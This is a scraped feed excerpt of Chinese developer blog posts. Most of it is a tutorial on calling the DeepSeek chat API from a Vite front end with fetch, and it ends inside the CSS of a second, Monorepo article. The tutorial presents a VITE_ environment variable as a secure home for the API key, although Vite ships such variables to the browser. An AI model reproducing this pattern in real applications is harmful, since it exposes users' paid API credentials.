如果你正在做项目，我可以帮你封装一个通用的 AI 调用模块 😊</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端调用大语言模型：基于 Vite 的工程化实践与 HTTP 请求详解]]></title>    <link>https://juejin.cn/post/7575090551357521972</link>    <guid>https://juejin.cn/post/7575090551357521972</guid>    <pubDate>2025-11-23T07:17:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357521972" data-draft-id="7575162322239881216" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 前端调用大语言模型：基于 Vite 的工程化实践与 HTTP 请求详解"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-11-23T07:17:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Tzarevich"/> <meta itemprop="url" content="https://juejin.cn/user/578786070367529"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             前端调用大语言模型：基于 Vite 的工程化实践与 HTTP 请求详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578786070367529/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Tzarevich
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:17:23.000Z" title="Sun Nov 23 2025 07:17:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前端调用大语言模型：基于 Vite 的工程化实践与 HTTP 请求详解</h2>
<p>随着人工智能技术的迅猛发展，大语言模型已逐渐从科研实验室走向工业应用。本文将围绕“前端如何以 HTTP 请求方式调用大语言模型”这一核心主题，结合现代前端工程化工具 Vite，详细讲解项目初始化、环境变量配置、fetch 请求封装、安全注意事项等关键环节，帮助读者掌握从前端发起 LLM 调用的全流程。</p>
<hr/>
<h3 data-id="heading-1">一、为什么前端可以直接调用 LLM？</h3>
<p>传统观点认为，AI 模型应由后端服务代理调用，前端仅负责展示结果。然而，在某些场景下，<strong>前端直连 LLM API 是可行且高效的</strong>，前提是：</p>
<ol>
<li><strong>API 支持 CORS（跨域资源共享）</strong> ：如 DeepSeek、OpenRouter 等部分服务商允许浏览器直接请求。</li>
<li><strong>安全性可控</strong>：通过短期有效的 API Key、IP 白名单、请求频率限制等方式降低风险。</li>
<li><strong>无需敏感数据处理</strong>：用户输入不涉及隐私或机密信息。</li>
</ol>
<p>以 DeepSeek 为例，其官方 API 支持 CORS，允许前端通过 <code>fetch</code> 直接发起 POST 请求，这为快速原型开发和轻量级应用提供了极大便利。</p>
<hr/>
<h3 data-id="heading-2">二、项目初始化：使用 Vite 搭建全栈友好型前端项目</h3>
<p>Vite 是新一代前端构建工具，以其极速的冷启动和热更新能力著称。虽然 Vite 本身是前端构建器，但其对环境变量、TypeScript、ESM 模块的原生支持，使其成为调用 LLM 的理想脚手架。</p>
<h4 data-id="heading-3">1. 创建项目</h4>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> vite<span class="hljs-variable">@latest</span> llm<span class="hljs-operator">-</span>frontend<span class="hljs-operator">-</span>demo <span class="hljs-comment">-- --template vanilla</span>
cd llm<span class="hljs-operator">-</span>frontend<span class="hljs-operator">-</span>demo
npm install
</code></pre>
<p>选择 <code>vanilla</code> 模板即可获得一个纯净的 HTML/CSS/JS 项目结构，适合教学和快速验证。</p>
<h4 data-id="heading-4">2. 配置环境变量</h4>
<p>出于安全考虑，<strong>API Key 绝不能硬编码在源码中</strong>。Vite 提供了 <code>.env</code> 文件机制，所有以 <code>VITE_</code> 开头的变量会被注入到客户端代码中。</p>
<p>创建 <code>.env.local</code> 文件（该文件通常加入 <code>.gitignore</code>，避免提交到版本控制）：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">VITE_DEEPSEEK_API_KEY</span>=sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</code></pre>
<blockquote>
<p>⚠️ 注意：此方法仅适用于 API 服务商允许前端直连的场景。若服务商禁止 CORS 或要求更高安全级别，则必须通过后端代理。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">三、HTTP 请求详解：如何正确调用 LLM API</h3>
<p>LLM API 通常遵循 RESTful 设计，使用 JSON 格式通信。以 DeepSeek 的 <code>/chat/completions</code> 接口为例，一次完整的请求包含三个部分：<strong>请求行、请求头、请求体</strong>。</p>
<h4 data-id="heading-6">1. 请求行（Request Line）</h4>
<ul>
<li><strong>Method</strong>: <code>POST</code>（因为需要发送消息内容）</li>
<li><strong>URL</strong>: <code>https://api.deepseek.com/chat/completions</code></li>
<li><strong>HTTP 版本</strong>: 通常由浏览器自动处理，无需显式指定</li>
</ul>
<h4 data-id="heading-7">2. 请求头（Headers）</h4>
<p>必须包含两个关键字段：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> headers = {
  <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
  <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${<span class="hljs-keyword">import</span>.meta.env.VITE_DEEPSEEK_API_KEY}</span>`</span>
};
</code></pre>
<ul>
<li><code>Content-Type: application/json</code> 告知服务器请求体为 JSON 格式。</li>
<li><code>Authorization: Bearer &lt;token&gt;</code> 是 OAuth 2.0 标准的认证方式，<code>Bearer</code> 为固定前缀。</li>
</ul>
<h4 data-id="heading-8">3. 请求体（Body）</h4>
<p>LLM 接口通常要求结构化的消息数组：</p>
<pre><code class="hljs language-css" lang="css">const payload = {
  model: <span class="hljs-string">'deepseek-chat'</span>, // 指定模型名称
  messages: [
    { role: <span class="hljs-string">"system"</span>, content: <span class="hljs-string">"You are a helpful assistant."</span> },
    { role: <span class="hljs-string">"user"</span>, content: <span class="hljs-string">"你好 DeepSeek"</span> }
  ]
};
</code></pre>
<p>注意：<strong>body 必须是字符串</strong>，不能直接传入 JavaScript 对象。需使用 <code>JSON.stringify()</code> 序列化：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span>: JSON.<span class="hljs-built_in">stringify</span>(payload)
</code></pre>
<h5 data-id="heading-9">为什么 body 必须是字符串？</h5>
<p>这是因为 <strong><code>fetch</code> API 的底层实现遵循 HTTP 协议规范</strong>，而 HTTP 协议规定：<strong>请求体（request body）只能是字节流（即二进制数据）</strong> 。在浏览器环境中，JavaScript 无法直接发送对象、数组等高级数据结构——这些结构只存在于运行时内存中，网络传输必须将其转换为可序列化的格式。</p>
<p>当你调用 <code>fetch</code> 并设置 <code>body</code> 字段时，浏览器期望你提供以下几种类型之一：</p>
<ul>
<li><code>string</code>（如 JSON 字符串）</li>
<li><code>FormData</code></li>
<li><code>URLSearchParams</code></li>
<li><code>Blob</code> / <code>ArrayBuffer</code> / <code>ReadableStream</code> 等二进制类型</li>
</ul>
<p>如果你直接传入一个 JavaScript 对象（例如 <code>{ key: "value" }</code>），浏览器会尝试将其隐式转换为字符串，结果通常是 <code>[object Object]</code> —— 这显然不是服务器期望的 JSON 格式，会导致 API 返回解析错误（如 400 Bad Request）。</p>
<p>因此，<strong>必须显式使用 <code>JSON.stringify()</code> 将对象转换为标准的 JSON 字符串</strong>，确保服务端能正确反序列化并理解你的请求内容。同时，配合设置请求头 <code>'Content-Type': 'application/json'</code>，告知服务器：“我发送的是 JSON 格式的文本”。</p>
<blockquote>
<p>✅ 正确做法：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span>: JSON.<span class="hljs-built_in">stringify</span>({ message: <span class="hljs-string">"hello"</span> })
</code></pre>
<p>❌ 错误做法：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">body</span>: { message: <span class="hljs-string">"hello"</span> }  // 实际发送的是 "<span class="hljs-selector-attr">[object Object]</span>"
</code></pre>
</blockquote>
<p>这一细节看似微小，却是前后端数据通信可靠性的关键保障。</p>
<h3 data-id="heading-10">四、使用 fetch 发起异步请求</h3>
<p>现代浏览器原生支持 <code>fetch</code> API，它是发起 HTTP 请求的标准方式。</p>
<h4 data-id="heading-11">完整调用示例</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">const</span> endpoint = <span class="hljs-string">'https://api.deepseek.com/chat/completions'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">callDeepSeek</span>(<span class="hljs-params">userMessage</span>) {
  <span class="hljs-keyword">const</span> headers = {
    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
    <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${<span class="hljs-keyword">import</span>.meta.env.VITE_DEEPSEEK_API_KEY}</span>`</span>
  };

  <span class="hljs-keyword">const</span> payload = {
    <span class="hljs-attr">model</span>: <span class="hljs-string">'deepseek-chat'</span>,
    <span class="hljs-attr">messages</span>: [
      { <span class="hljs-attr">role</span>: <span class="hljs-string">"system"</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">"You are a helpful assistant."</span> },
      { <span class="hljs-attr">role</span>: <span class="hljs-string">"user"</span>, <span class="hljs-attr">content</span>: userMessage }
    ]
  };

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(endpoint, {
      <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
      headers,
      <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(payload)
    });

    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`HTTP error! status: <span class="hljs-subst">${response.status}</span>`</span>);
    }

    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
    <span class="hljs-keyword">return</span> data.<span class="hljs-property">choices</span>[<span class="hljs-number">0</span>].<span class="hljs-property">message</span>.<span class="hljs-property">content</span>;
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'调用 DeepSeek 失败:'</span>, error);
    <span class="hljs-keyword">return</span> <span class="hljs-string">'抱歉，暂时无法获取回复。'</span>;
  }
}

<span class="hljs-comment">// 绑定按钮点击事件</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'send-btn'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'user-input'</span>);
  <span class="hljs-keyword">const</span> replyEl = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'reply'</span>);

  <span class="hljs-keyword">const</span> userMsg = input.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
  <span class="hljs-keyword">if</span> (!userMsg) <span class="hljs-keyword">return</span>;

  replyEl.<span class="hljs-property">textContent</span> = <span class="hljs-string">'思考中...'</span>;
  <span class="hljs-keyword">const</span> reply = <span class="hljs-keyword">await</span> <span class="hljs-title function_">callDeepSeek</span>(userMsg);
  replyEl.<span class="hljs-property">textContent</span> = reply;
  input.<span class="hljs-property">value</span> = <span class="hljs-string">''</span>;
});
</code></pre>
<h4 data-id="heading-12">关键点说明</h4>
<ul>
<li>使用 <code>async/await</code> 使异步代码更易读，避免回调地狱。</li>
<li>对 <code>response.ok</code> 进行判断，防止非 2xx 响应被误认为成功。</li>
<li>错误处理必不可少，网络波动或配额耗尽可能导致请求失败。</li>
</ul>
<hr/>
<h3 data-id="heading-13">五、工程化思维：代码如钢筋水泥</h3>
<p>在 Trae 所倡导的“工程化”理念中，代码不仅是功能的载体，更是可维护、可扩展、可协作的“建筑材料”。调用 LLM 不应只是复制粘贴一段 fetch 代码，而应思考：</p>
<ul>
<li><strong>可复用性</strong>：将 LLM 调用封装为独立函数或模块。</li>
<li><strong>可配置性</strong>：模型名称、系统提示词可通过参数传入。</li>
<li><strong>可测试性</strong>：模拟 API 响应进行单元测试。</li>
<li><strong>用户体验</strong>：加载状态、错误提示、输入限制等细节。</li>
</ul>
<p>例如，可进一步抽象为：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LLMClient</span> {
  <span class="hljs-keyword">constructor</span>(apiKey, model = <span class="hljs-string">'deepseek-chat'</span>) {
    <span class="hljs-keyword">this</span>.apiKey = apiKey;
    <span class="hljs-keyword">this</span>.model = model;
    <span class="hljs-keyword">this</span>.endpoint = <span class="hljs-string">'https://api.deepseek.com/chat/completions'</span>;
  }

  async chat(messages, systemPrompt = <span class="hljs-string">"You are a helpful assistant."</span>) {
    <span class="hljs-keyword">const</span> fullMessages = [
      { role: <span class="hljs-string">"system"</span>, content: systemPrompt },
      ...messages
    ];

    <span class="hljs-keyword">const</span> response = await fetch(<span class="hljs-keyword">this</span>.endpoint, {
      method: <span class="hljs-string">'POST'</span>,
      headers: {
        <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
        <span class="hljs-string">'Authorization'</span>: `Bearer ${<span class="hljs-keyword">this</span>.apiKey}`
      },
      body: JSON.stringify({ model: <span class="hljs-keyword">this</span>.model, messages: fullMessages })
    });

    <span class="hljs-keyword">const</span> <span class="hljs-keyword">data</span> = await response.json();
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>.choices[<span class="hljs-number">0</span>].message.content;
  }
}
</code></pre>
<p>这种面向对象的设计更利于大型项目集成。</p>
<hr/>
<h3 data-id="heading-14">六、安全与最佳实践</h3>
<p>尽管前端直连 LLM 便捷高效，但也存在风险：</p>
<ol>
<li>
<p><strong>API Key 泄露</strong>：一旦 <code>.env</code> 中的 Key 被提取，可能被滥用产生高额费用。</p>
<ul>
<li>解决方案：使用短期 Token、设置 IP 白名单、监控调用量。</li>
</ul>
</li>
<li>
<p><strong>CORS 限制</strong>：并非所有 LLM 服务商都开放 CORS。</p>
<ul>
<li>替代方案：通过 Vite 的代理功能（仅开发环境）或部署轻量后端（如 Cloudflare Workers）中转。</li>
</ul>
</li>
<li>
<p><strong>速率限制</strong>：频繁请求可能触发限流。</p>
<ul>
<li>建议：添加防抖、队列机制或用户提示。</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-15">结语</h3>
<p>前端调用大语言模型不再是遥不可及的概念，而是触手可及的工程实践。借助 Vite 的现代化开发体验和浏览器原生的 <code>fetch</code> 能力，我们可以快速构建具备 AI 能力的 Web 应用。然而，技术便利的背后是对工程规范、安全意识和用户体验的更高要求。</p>
<p>未来，随着 WebAssembly、WebGPU 等技术的发展，甚至可能在浏览器本地运行小型 LLM，实现完全离线的智能交互。但无论技术如何演进，“工程化”始终是高质量软件开发的基石——正如钢筋水泥之于摩天大楼，代码结构之于数字世界。</p>
<blockquote>
<p><strong>代码不是魔法，而是精心设计的工程。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Monorepo 架构全解析：从概念到落地的完整指南]]></title>    <link>https://juejin.cn/post/7575807729722392610</link>    <guid>https://juejin.cn/post/7575807729722392610</guid>    <pubDate>2025-11-23T08:06:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575807729722392610" data-draft-id="7575807729722228770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Monorepo 架构全解析：从概念到落地的完整指南"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T08:06:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Wect"/> <meta itemprop="url" content="https://juejin.cn/user/4185164878720068"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Monorepo 架构全解析：从概念到落地的完整指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185164878720068/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Wect
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:06:51.000Z" title="Sun Nov 23 2025 08:06:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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